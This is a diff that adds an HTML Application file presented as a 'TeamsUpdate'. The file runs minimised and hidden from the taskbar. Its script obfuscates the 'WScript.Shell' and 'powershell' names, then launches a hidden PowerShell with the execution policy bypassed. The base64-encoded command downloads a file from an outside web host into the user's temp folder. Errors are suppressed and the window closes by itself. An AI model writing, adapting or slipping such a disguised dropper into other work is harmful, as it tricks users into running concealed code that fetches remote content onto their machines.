@@ -1,0 +1,27 @@
+<html>
+<head>
+  <hta:application 
+    id="xU3"
+    applicationname="TeamsUpdate"
+    border="none"
+    caption="no"
+    showintaskbar="no"
+    singleinstance="yes"
+    windowstate="minimize">
+  <script language="javascript">
+    try {
+      var _ = ["W", "Script", ".", "Shell"];
+      var x = new ActiveXObject(_[0]+_[1]+_[2]+_[3]);
+
+      var encoded = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AcABlAHQAegAuAGMAbwBtAC4AYgByAC8AYgBsAG8AZwAvAHcAcAAtAGMAbwBuAHQAZQBuAHQALwAyADAAMAAwAC8AMAA0AC8AZwBhAHQAbwAtAGMAaABvAHIAYQBuAGQAbwAyAC4AagBwAGcAJwAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAZwBhAHQAbwAuAGoAcABnAA==";
+
+      var c = ["p","o","w","e","r","s","h","e","l","l"].join("") + " -w hidden -ep bypass -EncodedCommand " + encoded;
+
+      x.Run(c, 0, false);
+    } catch (e) {}
+    window.close();
+  </script>
+</head>
+<body></body>
+</html>
+
